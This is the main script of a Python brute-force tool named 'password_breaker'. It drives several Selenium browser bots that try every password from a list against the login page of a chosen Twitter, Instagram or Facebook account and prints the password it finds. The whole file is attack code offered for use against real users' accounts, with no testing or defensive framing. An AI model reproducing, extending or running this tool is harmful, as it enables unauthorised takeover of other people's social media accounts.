# Date: 19/05/2020
# Author: theVirtualMan
# Description: password_breaker

from platform import python_version
from argparse import ArgumentParser, ArgumentTypeError


from selenium import webdriver
from selenium.webdriver.support.ui import WebDriverWait
from pyvirtualdisplay import Display

from lib.const import login_url, modes
from lib.browser import Browser
from lib.brute_search import BruteSearch

import time

class Engine(object):

    def __init__(self, username, passlist_path, service, threads):
        self.is_alive = True
        self.username = username
        self.passlist_path = passlist_path
        self.url = login_url[service]
        self.threads = threads
        self.browser = Browser(self.threads)


    def start(self):

        bruter = BruteSearch(self.username, self.passlist_path, self.url, self.browser.browsers).start()
        if bruter == None:
            print('password not found')
        else:
            print('password found')
            print('password: ',bruter)

def args():
    args = ArgumentParser()
    args.add_argument('service', help='Twitter or Instagram or Facebook')
    args.add_argument('username', help='email or username')
    args.add_argument('passlist', help='password list')
    args.add_argument('-m', '--mode', default=2, type=int,
                      help='modes: 0 => 32 bots; 1 => 16 bots; 2 => 8 bots; 3 => 4 bots') ################
    return args.parse_args()



if __name__ == '__main__':

    start_time = time.time()

    if int(python_version()[0]) < 3:
        print('[!] Please use Python 3')
        exit()

    arugments = args()
    service = arugments.service
    username = arugments.username
    passlist = arugments.passlist
    mode = arugments.mode

    Engine(username, passlist, service, modes[mode]).start()

    print('\n Time elapsed: ', (time.time() - start_time), ' seconds')